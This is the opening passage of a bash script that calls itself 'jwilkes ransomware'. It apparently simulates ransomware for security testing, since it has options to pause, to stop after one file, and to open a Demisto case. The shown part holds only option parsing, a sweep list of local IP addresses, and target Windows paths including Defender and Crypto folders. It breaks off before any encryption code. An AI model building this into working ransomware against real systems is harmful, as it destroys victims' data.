#!/bin/bash

usage="

jwilkes [-h] [-p t -k t -a t] -- program to execute jwilkes ransomware

where:
    -h  show this help text
    -p  set the pause to 't' (true) to pause before encryption
    -k  set the kill to 't' (true) to kill the malware after attempted encryption of 1 file
    -a  set the AWS call to 't' (true) to create a case in Demisto

"


while getopts hp:k:a: opts; do
   case ${opts} in
      p) pause=${OPTARG} ;;
      k) kill=${OPTARG} ;;
	    a) amazon=${OPTARG} ;;
   	  h) echo "$usage"
		 exit
		 ;;
   esac
done


ipArr=("192.168.0.0" "192.168.0.1" "192.168.0.2" "192.168.0.3" "192.168.0.4" "192.168.0.5" "192.168.0.6" "192.168.0.7" "192.168.0.8" "192.168.0.9" "192.168.0.10" "192.168.0.11" "192.168.0.12" "192.168.0.13" "192.168.0.14" "192.168.0.15" "192.168.0.16" "192.168.0.17" "192.168.0.18" "192.168.0.19" "192.168.0.20" "192.168.0.21" "192.168.0.22" "192.168.0.23" "192.168.0.24" "192.168.0.25" "192.168.0.26" "192.168.0.27" "192.168.0.28" "192.168.0.29" "192.168.0.30" "192.168.0.31" "192.168.0.32" "192.168.0.33" "192.168.0.34" "192.168.0.35" "192.168.0.36" "192.168.0.37" "192.168.0.38" "192.168.0.39" "192.168.0.40" "192.168.0.41" "192.168.0.42" "192.168.0.43" "192.168.0.44" "192.168.0.45" "192.168.0.46" "192.168.0.47" "192.168.0.48" "192.168.0.49" "192.168.0.50" "192.168.0.51" "192.168.0.52" "192.168.0.53" "192.168.0.54" "192.168.0.55" "192.168.0.56" "192.168.0.57" "192.168.0.58" "192.168.0.59" "192.168.0.60" "192.168.0.61" "192.168.0.62" "192.168.0.63" "192.168.0.64" "192.168.0.65" "192.168.0.66" "192.168.0.67" "192.168.0.68" "192.168.0.69" "192.168.0.70" "192.168.0.71" "192.168.0.72" "192.168.0.73" "192.168.0.74" "192.168.0.75" "192.168.0.76" "192.168.0.77" "192.168.0.78" "192.168.0.79" "192.168.0.80" "192.168.0.81" "192.168.0.82" "192.168.0.83" "192.168.0.84" "192.168.0.85" "192.168.0.86" "192.168.0.87" "192.168.0.88" "192.168.0.89" "192.168.0.90" "192.168.0.91" "192.168.0.92" "192.168.0.93" "192.168.0.94" "192.168.0.95" "192.168.0.96" "192.168.0.97" "192.168.0.98" "192.168.0.99" "192.168.0.100" "192.168.0.101" "192.168.0.102" "192.168.0.103" "192.168.0.104" "192.168.0.105" "192.168.0.106" "192.168.0.107" "192.168.0.108" "192.168.0.109" "192.168.0.110" "192.168.0.111" "192.168.0.112" "192.168.0.113" "192.168.0.114" "192.168.0.115" "192.168.0.116" "192.168.0.117" "192.168.0.118" "192.168.0.119" "192.168.0.120" "192.168.0.121" "192.168.0.122" "192.168.0.123" "192.168.0.124" "192.168.0.125" "192.168.0.126" "192.168.0.127" "192.168.0.128" "192.168.0.129" "192.168.0.130" "192.168.0.131" "192.168.0.132" "192.168.0.133" "192.168.0.134" "192.168.0.135" "192.168.0.136" "192.168.0.137" "192.168.0.138" "192.168.0.139" "192.168.0.140" "192.168.0.141" "192.168.0.142" "192.168.0.143" "192.168.0.144" "192.168.0.145" "192.168.0.146" "192.168.0.147" "192.168.0.148" "192.168.0.149" "192.168.0.150" "192.168.0.151" "192.168.0.152" "192.168.0.153" "192.168.0.154" "192.168.0.155" "192.168.0.156" "192.168.0.157" "192.168.0.158" "192.168.0.159" "192.168.0.160" "192.168.0.161" "192.168.0.162" "192.168.0.163" "192.168.0.164" "192.168.0.165" "192.168.0.166" "192.168.0.167" "192.168.0.168" "192.168.0.169" "192.168.0.170" "192.168.0.171" "192.168.0.172" "192.168.0.173" "192.168.0.174" "192.168.0.175" "192.168.0.176" "192.168.0.177" "192.168.0.178" "192.168.0.179" "192.168.0.180" "192.168.0.181" "192.168.0.182" "192.168.0.183" "192.168.0.184" "192.168.0.185" "192.168.0.186" "192.168.0.187" "192.168.0.188" "192.168.0.189" "192.168.0.190" "192.168.0.191" "192.168.0.192" "192.168.0.193" "192.168.0.194" "192.168.0.195" "192.168.0.196" "192.168.0.197" "192.168.0.198" "192.168.0.199" "192.168.0.200" "192.168.0.201" "192.168.0.202" "192.168.0.203" "192.168.0.204" "192.168.0.205" "192.168.0.206" "192.168.0.207" "192.168.0.208" "192.168.0.209" "192.168.0.210" "192.168.0.211" "192.168.0.212" "192.168.0.213" "192.168.0.214" "192.168.0.215" "192.168.0.216" "192.168.0.217" "192.168.0.218" "192.168.0.219" "192.168.0.220" "192.168.0.221" "192.168.0.222" "192.168.0.223" "192.168.0.224" "192.168.0.225" "192.168.0.226" "192.168.0.227" "192.168.0.228" "192.168.0.229" "192.168.0.230" "192.168.0.231" "192.168.0.232" "192.168.0.233" "192.168.0.234" "192.168.0.235" "192.168.0.236" "192.168.0.237" "192.168.0.238" "192.168.0.239" "192.168.0.240" "192.168.0.241" "192.168.0.242" "192.168.0.243" "192.168.0.244" "192.168.0.245" "192.168.0.246" "192.168.0.247" "192.168.0.248" "192.168.0.249" "192.168.0.250" "192.168.0.251" "192.168.0.252" "192.168.0.253" "192.168.0.254" "192.168.0.255")

dirArr=("C:\Users\jwilkes" "C:\Users\jwilkes\Comms" "C:\Users\jwilkes\Notepad++" "C:\Users\jwilkes\Package Cache" "C:\Users\jwilkes\regid.1991-06.com.microsoft" "C:\Users\jwilkes\SoftwareDistribution" "C:\Users\jwilkes\USOPrivate" "C:\Users\jwilkes\USOShared" "C:\Users\jwilkes\Microsoft\AppV" "C:\Users\jwilkes\Microsoft\Crypto" "C:\Users\jwilkes\Microsoft\Device Stage" "C:\Users\jwilkes\Microsoft\DeviceSync" "C:\Users\jwilkes\Microsoft\DRM" "C:\Users\jwilkes\Microsoft\Event Viewer" "C:\Users\jwilkes\Microsoft\IdentityCRL" "C:\Users\jwilkes\Microsoft\MapData" "C:\Users\jwilkes\Microsoft\MF" "C:\Users\jwilkes\Microsoft\NetFramework" "C:\Users\jwilkes\Microsoft\Network" "C:\Users\jwilkes\Microsoft\ServerManager" "C:\Users\jwilkes\Microsoft\Settings" "C:\Users\jwilkes\Microsoft\Speech_OneCore" "C:\Users\jwilkes\Microsoft\UEV" "C:\Users\jwilkes\Microsoft\User Account Pictures" "C:\Users\jwilkes\Microsoft\Vault" "C:\Users\jwilkes\Microsoft\WDF" "C:\Users\jwilkes\Microsoft\Windows" "C:\Users\jwilkes\Microsoft\Windows Defender" "C:\Users\jwilkes\Microsoft\Windows Live" "C:\Users\jwilkes\Microsoft\WinMSIPC" "C:\Users\jwilkes\Microsoft\AppV\Setup\OfficeIntegrator.ps1" "C:\Users\jwilkes\Microsoft\Crypto\DSS" "C:\Users\jwilkes\Microsoft\Crypto\PCPKSP" "C:\Users\jwilkes\Microsoft\Crypto\RSA" "C:\Users\jwilkes\Microsoft\Crypto\DSS\MachineKeys" "C:\Users\jwilkes\Microsoft\Crypto\RSA\MachineKeys" "C:\Users\jwilkes\Microsoft\Device Stage\Device" "C:\Users\jwilkes\Microsoft\Device Stage\Task" "C:\Users\jwilkes\Microsoft\Device Stage\Device\{113527a4-45d4-4b6f-b567-97838f1b04b0}" "C:\Users\jwilkes\Microsoft\Device Stage\Device\{8702d817-5aad-4674-9ef3-4d3decd87120}" "C:\Users\jwilkes\Microsoft\Device Stage\Device\{113527a4-45d4-4b6f-b567-97838f1b04b0}\background.png" "C:\Users\jwilkes\Microsoft\Device Stage\Device\{113527a4-45d4-4b6f-b567-97838f1b04b0}\behavior.xml" "C:\Users\jwilkes\Microsoft\Device Stage\Device\{113527a4-45d4-4b6f-b567-97838f1b04b0}\device.png" "C:\Users\jwilkes\Microsoft\Device Stage\Device\{113527a4-45d4-4b6f-b567-97838f1b04b0}\overlay.png" "C:\Users\jwilkes\Microsoft\Device Stage\Device\{113527a4-45d4-4b6f-b567-97838f1b04b0}\superbar.png" "C:\Users\jwilkes\Microsoft\Device Stage\Device\{8702d817-5aad-4674-9ef3-4d3decd87120}\background.png" "C:\Users\jwilkes\Microsoft\Device Stage\Device\{8702d817-5aad-4674-9ef3-4d3decd87120}\behavior.xml" "C:\Users\jwilkes\Microsoft\Device Stage\Device\{8702d817-5aad-4674-9ef3-4d3decd87120}\watermark.png" "C:\Users\jwilkes\Microsoft\Device Stage\Task\{07deb856-fc6e-4fb9-8add-d8f2cf8722c9}" "C:\Users\jwilkes\Microsoft\Event Viewer\Views" "C:\Users\jwilkes\Microsoft\Event Viewer\Views\ServerRoles" "C:\Users\jwilkes\Microsoft\Event Viewer\Views\ServerRoles\RemoteDesktop.Events.xml" "C:\Users\jwilkes\Microsoft\IdentityCRL\INT" "C:\Users\jwilkes\Microsoft\IdentityCRL\production" "C:\Users\jwilkes\Microsoft\IdentityCRL\INT\ppcrlconfig600.dll" "C:\Users\jwilkes\Microsoft\IdentityCRL\production\ppcrlconfig600.dll" "C:\Users\jwilkes\Microsoft\IdentityCRL\production\temp" "C:\Users\jwilkes\Microsoft\MF\Active.GRL" "C:\Users\jwilkes\Microsoft\MF\Pending.GRL" "C:\Users\jwilkes\Microsoft\NetFramework\BreadcrumbStore" "C:\Users\jwilkes\Microsoft\Network\Connections" "C:\Users\jwilkes\Microsoft\Network\Downloader" "C:\Users\jwilkes\Microsoft\ServerManager\Events" "C:\Users\jwilkes\Microsoft\ServerManager\Events\FileServer.Events.xml" "C:\Users\jwilkes\Microsoft\Settings\Accounts" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates" "C:\Users\jwilkes\Microsoft\UEV\Templates" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\DesktopSettings2013.xml" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\EaseOfAccessSettings2013.xml" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\MicrosoftInternetExplorer2013.xml" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\MicrosoftInternetExplorer2013Backup.xml" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\MicrosoftLync2010.xml" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\MicrosoftLync2013Win32.xml" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\MicrosoftLync2013Win64.xml" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\MicrosoftNotepad.xml" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\MicrosoftOffice2010Win32.xml" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\MicrosoftOffice2010Win64.xml" "C:\Users\jwilkes\Microsoft\UEV\InboxTemplates\MicrosoftOffice2013BackupWin32.xml" "C:\Users\jwilkes\Microsoft\UEV\Templates\SettingsLocationTemplate2013A.xsd" "C:\Users\jwilkes\Microsoft\User Account Pictures\Administrator.dat" "C:\Users\jwilkes\Microsoft\User Account Pictures\Annoying.dat" "C:\Users\jwilkes\Microsoft\User Account Pictures\guest.bmp" "C:\Users\jwilkes\Microsoft\User Account Pictures\guest.png" "C:\Users\jwilkes\Microsoft\User Account Pictures\Somber.dat" "C:\Users\jwilkes\Microsoft\User Account Pictures\user-192.png" "C:\Users\jwilkes\Microsoft\User Account Pictures\user-32.png" "C:\Users\jwilkes\Microsoft\User Account Pictures\user-40.png" "C:\Users\jwilkes\Microsoft\User Account Pictures\user-48.png" "C:\Users\jwilkes\Microsoft\User Account Pictures\user.bmp" "C:\Users\jwilkes\Microsoft\User Account Pictures\user.png" "C:\Users\jwilkes\Microsoft\User Account Pictures\VMAdmin.dat" "C:\Users\jwilkes\Microsoft\Vault\AC658CB4-9126-49BD-B877-31EEDAB3F204" "C:\Users\jwilkes\Microsoft\Vault\AC658CB4-9126-49BD-B877-31EEDAB3F204\154E23D0-C644-4E6F-8CE6-5069272F999F.vsch" "C:\Users\jwilkes\Microsoft\Vault\AC658CB4-9126-49BD-B877-31EEDAB3F204\2F1A6504-0641-44CF-8BB5-3612D865F2E5.vsch" "C:\Users\jwilkes\Microsoft\Vault\AC658CB4-9126-49BD-B877-31EEDAB3F204\3CCD5499-87A8-4B10-A215-608888DD3B55.vsch" "C:\Users\jwilkes\Microsoft\Vault\AC658CB4-9126-49BD-B877-31EEDAB3F204\Policy.vpol" "C:\Users\jwilkes\Microsoft\Windows\AppRepository" "C:\Users\jwilkes\Microsoft\Windows\Caches" "C:\Users\jwilkes\Microsoft\Windows\ClipSVC" "C:\Users\jwilkes\Microsoft\Windows\DeviceMetadataCache" "C:\Users\jwilkes\Microsoft\Windows\DeviceMetadataStore" "C:\Users\jwilkes\Microsoft\Windows\GameExplorer" "C:\Users\jwilkes\Microsoft\Windows\Power Efficiency Diagnostics" "C:\Users\jwilkes\Microsoft\Windows\Ringtones" "C:\Users\jwilkes\Microsoft\Windows\SleepStudy" "C:\Users\jwilkes\Microsoft\Windows\Sqm" "C:\Users\jwilkes\Microsoft\Windows\Start Menu" "C:\Users\jwilkes\Microsoft\Windows\Start Menu Places" "C:\Users\jwilkes\Microsoft\Windows\SystemData" "C:\Users\jwilkes\Microsoft\Windows\Templates" "C:\Users\jwilkes\Microsoft\Windows\WER" "C:\Users\jwilkes\Microsoft\Windows\wfp" "C:\Users\jwilkes\Microsoft\Windows\Caches\cversions.2.db" "C:\Users\jwilkes\Microsoft\Windows\Caches\{6AF0698E-D558-4F6E-9B3C-3716689AF493}.2.ver0x0000000000000004.db" "C:\Users\jwilkes\Microsoft\Windows\Caches\{DDF571F2-BE98-426D-8288-1A9A39C3FDA2}.2.ver0x0000000000000004.db" "C:\Users\jwilkes\Microsoft\Windows\ClipSVC\Archive" "C:\Users\jwilkes\Microsoft\Windows\ClipSVC\GenuineTicket" "C:\Users\jwilkes\Microsoft\Windows\ClipSVC\Import" "C:\Users\jwilkes\Microsoft\Windows\ClipSVC\Install" "C:\Users\jwilkes\Microsoft\Windows\ClipSVC\tokens.dat" "C:\Users\jwilkes\Microsoft\Windows\DeviceMetadataCache\dmrc.idx" "C:\Users\jwilkes\Microsoft\Windows\DeviceMetadataCache\dmrccache" "C:\Users\jwilkes\Microsoft\Windows\DeviceMetadataStore\en-US" "C:\Users\jwilkes\Microsoft\Windows\DeviceMetadataStore\en-US\34e548a8-3268-4dde-bedf-c40f9b6c814a.devicemetadata-ms" "C:\Users\jwilkes\Microsoft\Windows\DeviceMetadataStore\en-US\63921eef-8415-4368-9201-f0df4af5778f.devicemetadata-ms" "C:\Users\jwilkes\Microsoft\Windows\Sqm\Manifest" "C:\Users\jwilkes\Microsoft\Windows\Sqm\Sessions" "C:\Users\jwilkes\Microsoft\Windows\Sqm\Upload" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\7-Zip" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessibility" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Firefox.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Google Chrome.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Maintenance" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Notepad++.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Server Manager.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\StartUp" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\System Tools" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\VideoLAN" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\7-Zip\7-Zip File Manager.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\7-Zip\7-Zip Help.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessibility\Speech Recognition.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\Calculator.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\Math Input Panel.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\Paint.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\Remote Desktop Connection.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\Snipping Tool.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\Steps Recorder.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\Windows Media Player.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\Wordpad.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Character Map.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Accessories\System Tools\Windows Server Backup.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Print Management.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Resource Monitor.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Security Configuration Management.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Server Manager.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\services.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\System Configuration.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\System Information.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Task Scheduler.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Terminal Services" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Windows Firewall with Advanced Security.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\Administrative Tools\Windows Server Backup.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\System Tools\Task Manager.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\System Tools\Windows Defender.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\VideoLAN\Documentation.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\VideoLAN\Release Notes.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\VideoLAN\VideoLAN Website.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\VideoLAN\VLC media player - reset preferences and cache files.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\VideoLAN\VLC media player skinned.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu\Programs\VideoLAN\VLC media player.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu Places\01 - File Explorer.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu Places\03 - Documents.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu Places\04 - Downloads.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu Places\05 - Music.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu Places\06 - Pictures.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu Places\07 - Videos.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu Places\08 - Homegroup.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu Places\09 - Network.lnk" "C:\Users\jwilkes\Microsoft\Windows\Start Menu Places\10 - UserProfile.lnk" "C:\Users\jwilkes\Microsoft\Windows\WER\ReportArchive\NonCritical_x64_fd14bf82d030e790335a8e1cda77367ac1c51e6d_00000000_060487be" "C:\Users\jwilkes\Microsoft\Windows Defender\Clean Store" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates" "C:\Users\jwilkes\Microsoft\Windows Defender\Features" "C:\Users\jwilkes\Microsoft\Windows Defender\LocalCopy" "C:\Users\jwilkes\Microsoft\Windows Defender\Network Inspection System" "C:\Users\jwilkes\Microsoft\Windows Defender\platform" "C:\Users\jwilkes\Microsoft\Windows Defender\Quarantine" "C:\Users\jwilkes\Microsoft\Windows Defender\Scans" "C:\Users\jwilkes\Microsoft\Windows Defender\Support" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Backup" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Default" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Updates" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\{E4C1DBD8-2B6E-45F9-8F50-2832306951E9}" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Backup\mpasbase.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Backup\mpasdlta.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Backup\mpavbase.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Backup\mpavdlta.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Backup\mpengine.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Backup\mpengine.lkg" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Default\GapaEngine.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Default\MpAsBase.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Default\MpAsDlta.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Default\MpAvBase.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Default\MpAvDlta.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Default\MpEngine.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Default\NisBase.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\Default\NisFull.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\{E4C1DBD8-2B6E-45F9-8F50-2832306951E9}\mpasbase.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\{E4C1DBD8-2B6E-45F9-8F50-2832306951E9}\mpasdlta.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\{E4C1DBD8-2B6E-45F9-8F50-2832306951E9}\mpavbase.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\{E4C1DBD8-2B6E-45F9-8F50-2832306951E9}\mpavdlta.vdm" "C:\Users\jwilkes\Microsoft\Windows Defender\Definition Updates\{E4C1DBD8-2B6E-45F9-8F50-2832306951E9}\mpengine.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1902.2-0" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\MpOAV.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\MpRtp.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\MpSvc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\MpUpdate.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\MsMpEng.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\MsMpLics.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\NisSrv.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\X86" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\X86\en-US" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\X86\MpAsDesc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\X86\MpClient.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\X86\MpOAV.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\X86\MsMpLics.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1806.18062-0\X86\en-US\mpasdesc.dll.mui" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\ConfigSecurityPolicy.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\Drivers" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\en-US" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MpAsDesc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MpAzSubmit.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MpClient.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MpCmdRun.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MpCommu.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MpOAV.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MpRtp.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MpSvc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MpUpdate.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MsMpEng.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\MsMpLics.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\NisSrv.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\X86" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\Drivers\WdBoot.sys" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\Drivers\WdFilter.sys" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\Drivers\WdNisDrv.sys" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\en-US\mpasdesc.dll.mui" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\X86\en-US" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\X86\MpAsDesc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\X86\MpClient.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\X86\MpOAV.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\X86\MsMpLics.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1812.3-0\X86\en-US\mpasdesc.dll.mui" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\ConfigSecurityPolicy.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\Drivers" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\en-US" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MpAsDesc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MpAzSubmit.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MpClient.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MpCmdRun.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MpCommu.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MpOAV.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MpRtp.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MpSvc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MpUpdate.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MsMpEng.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\MsMpLics.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\NisSrv.exe" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\X86" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\Drivers\WdBoot.sys" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\Drivers\WdFilter.sys" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\Drivers\WdNisDrv.sys" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\en-US\mpasdesc.dll.mui" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\X86\en-US" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\X86\MpAsDesc.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\X86\MpClient.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\X86\MpOAV.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\X86\MsMpLics.dll" "C:\Users\jwilkes\Microsoft\Windows Defender\platform\4.18.1901.7-0\X86\en-US\mpasdesc.dll.mui" "C:\Users\jwilkes\Microsoft\Windows 